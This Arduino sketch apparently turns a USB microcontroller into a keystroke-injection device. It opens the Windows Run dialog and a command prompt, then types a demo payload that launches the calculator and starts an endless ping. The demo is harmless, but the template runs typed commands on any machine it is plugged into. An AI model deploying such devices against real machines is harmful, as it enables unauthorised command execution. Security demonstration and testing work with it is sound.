#include <Arduino.h>
#include <Keyboard_AZERTY.h>

void open_run();
void open_cmd();
void send_payload();

void setup() {
  Keyboard.begin();
  // Give 10 Sec delay before spawning script. HID Driver installer etc...
  // Just some buffer room..
  delay(10000);

  open_run();
  open_cmd();
  send_payload();
  
  Keyboard.end();
}

void loop() {
  // We won't need loop. Could use it, don't want to spam keyboard...
}

void send_payload(){
  Keyboard.print("calc.exe");
  Keyboard.write(KEY_RETURN);
  Keyboard.print("ping -t www.google.be");
  Keyboard.write(KEY_RETURN);
}

void open_cmd(){
  Keyboard.print("cmd.exe");
  Keyboard.write(KEY_RETURN);
  delay(500);
}

void open_run(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  delay(500);
  Keyboard.releaseAll();
}

void ctrl_alt_delete() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_DELETE);
  delay(100);
  Keyboard.releaseAll();
}